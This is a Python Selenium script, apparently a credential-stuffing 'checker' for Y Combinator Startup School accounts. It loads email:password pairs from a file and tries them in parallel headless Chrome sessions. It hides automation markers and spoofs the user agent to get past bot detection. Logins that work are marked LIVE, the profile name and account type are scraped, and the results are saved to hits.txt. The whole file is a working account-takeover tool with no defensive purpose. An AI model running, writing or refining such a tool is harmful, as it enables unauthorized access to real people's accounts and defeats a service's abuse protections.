"""
YC Startup School Checker - Selenium
Testa login + captura dados do perfil
"""
import time, os, json, re, threading, queue
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options

URL = "https://account.ycombinator.com/?continue=https%3A%2F%2Fwww.startupschool.org%2Fusers%2Fsign_in"
ACC_FILE = os.path.join(os.path.dirname(__file__), "contas.txt")
HITS_FILE = os.path.join(os.path.dirname(__file__), "hits.txt")
WORKERS = 4

def check_one(user, password):
    result = {"user": user, "status": "die", "info": ""}
    
    options = Options()
    options.add_argument("--window-size=1366,768")
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    
    driver = webdriver.Chrome(options=options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.execute_cdp_cmd("Network.setUserAgentOverride", {"userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
    
    try:
        driver.get(URL)
        time.sleep(5)
        
        # YC usa name=username (nao email!)
        try:
            email_field = driver.find_element(By.NAME, "username")
        except:
            try:
                email_field = driver.find_element(By.ID, "ycid-input")
            except:
                return result
        
        email_field.clear(); email_field.send_keys(user)
        
        # Password
        try:
            pwd = driver.find_element(By.NAME, "password")
        except:
            pwd = driver.find_element(By.ID, "password-input")
        pwd.clear(); pwd.send_keys(password)
        
        time.sleep(0.5)
        
        # Submit via JS (triggers native form handler + anti-CF bypass)
        driver.execute_script("""
            var form = document.getElementById('sign-in-card');
            if (form) {
                var btn = form.querySelector('button[type="submit"]');
                if (btn) btn.click();
            }
        """)
        
        time.sleep(8)
        
        # Verifica login
        page = driver.page_source.lower()
        current_url = driver.current_url
        
        # Login OK = URL mudou de /account.ycombinator.com
        if "account.ycombinator.com" not in current_url:
            result["status"] = "live"
            
            # Detecta applicant vs active
            if "edit_sign_up" in current_url:
                result["info"] = "NAO APLICADO (Applicant)"
            elif "dashboard" in current_url:
                result["info"] = "ATIVO (Startup School)"
            elif "cofounder" in current_url or "cofounder" in page:
                result["info"] = "ATIVO (Cofounder)"
            else:
                result["info"] = "Login OK | " + current_url.split("/")[-1]
            
            # Extrai nome
            for sel in ["h1", "h2", ".profile-name", ".user-name", "[data-test='user-name']"]:
                try:
                    name = driver.find_element(By.CSS_SELECTOR, sel).text.strip()
                    if name and len(name) < 100:
                        result["info"] += f" | {name[:50]}"
                        break
                except: pass
        elif "invalid" in page or "wrong" in page or "incorrect" in page:
            result["info"] = "Wrong credentials"
        else:
            result["info"] = "Login failed (CF/JS)"
        
    except Exception as e:
        result["info"] = str(e)[:60]
    finally:
        driver.quit()
    
    return result

# Main
accounts = []
if os.path.exists(ACC_FILE):
    with open(ACC_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and ":" in line and not line.startswith("#"):
                accounts.append(line)
if not accounts:
    accounts = ["test@test.com:test123"]

print(f"=== YC Startup School Checker - {len(accounts)} conta(s) ===\n")

print(f"=== YC Startup School - {len(accounts)} contas - {WORKERS} workers ===\n")

# Paralelo com queue
in_q = queue.Queue()
out_q = queue.Queue()
for acc in accounts:
    in_q.put(acc)

results_all = []
lock = threading.Lock()
done = [0]
lives = [0]

def worker_fn():
    while True:
        try:
            acc = in_q.get(timeout=1)
        except queue.Empty:
            break
        u, p = acc.split(":", 1)
        r = check_one(u, p)
        
        with lock:
            done[0] += 1
            if r["status"] == "live": lives[0] += 1
            n = done[0]
            total = len(accounts)
        
        st = "LIVE" if r["status"] == "live" else "DIE"
        line = f"{st} | {u} | {r['info']}"
        print(f"[{n}/{total}] {line}")
        results_all.append(line)
        
        # Salva hits em tempo real (so LIVE)
        if r["status"] == "live":
            with open(HITS_FILE, "a", encoding="utf-8") as hf:
                hf.write(line + "\n")
        
        in_q.task_done()

threads = []
for _ in range(min(WORKERS, len(accounts))):
    t = threading.Thread(target=worker_fn, daemon=True)
    t.start()
    threads.append(t)

in_q.join()
for t in threads:
    t.join(timeout=2)

print(f"\n=== {lives[0]}/{len(results_all)} LIVE | Salvo em hits.txt ===")
